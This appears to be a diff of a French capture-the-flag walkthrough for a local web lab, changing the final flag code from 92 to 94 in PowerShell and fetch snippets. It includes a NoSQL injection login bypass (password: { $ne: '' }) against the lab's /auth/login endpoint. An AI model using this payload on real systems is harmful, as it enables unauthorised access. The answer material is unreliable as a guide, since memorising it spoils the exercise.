@@ -29,7 +29,7 @@ $gate = Invoke-RestMethod -Uri ("http://localhost:3000/gate/" + $token) -WebSess
 $gate | Format-List
 
 # 7) Soumettre le code département final
-$flag = Invoke-RestMethod -Uri 'http://localhost:3000/flag' -Method Post -ContentType 'application/json' -WebSession $session -Body (@{ code = 92 } | ConvertTo-Json)
+$flag = Invoke-RestMethod -Uri 'http://localhost:3000/flag' -Method Post -ContentType 'application/json' -WebSession $session -Body (@{ code = 94 } | ConvertTo-Json)
 $flag
 
 
@@ -60,7 +60,9 @@ fetch('/auth/login', {
     username: 'alice',
     password: { $ne: '' }
   })
-}).then(r => r.json()).then(console.log)
+})
+  .then(r => r.json())
+  .then(data => window.location.href = data.redirect);
 ```
 
 7. Verifie les logs admin dans le navigateur :
@@ -71,11 +73,11 @@ http://localhost:3000/auth/logs
 
 8. Ouvre http://localhost:3000/billet.html pour recuperer le billet et le gateUrl (via QR ou URL)
 9. Ouvre l'URL gate, tu obtiens message = RVN et hint = JN03EL
-10. IMPORTANT : la page gate JSON n'est pas le flag. Elle donne seulement l'indice final (code 92).
+10. IMPORTANT : la page gate JSON n'est pas le flag. Elle donne seulement l'indice final (code 94).
 11. Pour recuperer le flag en PowerShell, execute exactement :
 
 ```powershell
-$flag = Invoke-RestMethod -Uri 'http://localhost:3000/flag' -Method Post -ContentType 'application/json' -WebSession $session -Body (@{ code = 92 } | ConvertTo-Json)
+$flag = Invoke-RestMethod -Uri 'http://localhost:3000/flag' -Method Post -ContentType 'application/json' -WebSession $session -Body (@{ code = 94 } | ConvertTo-Json)
 $flag
 ```
 
@@ -86,7 +88,7 @@ fetch('/flag', {
   method: 'POST',
   headers: { 'Content-Type': 'application/json' },
   credentials: 'include',
-  body: JSON.stringify({ code: 92 })
+  body: JSON.stringify({ code: 94 })
 }).then(r => r.json()).then(console.log)
 ```
 
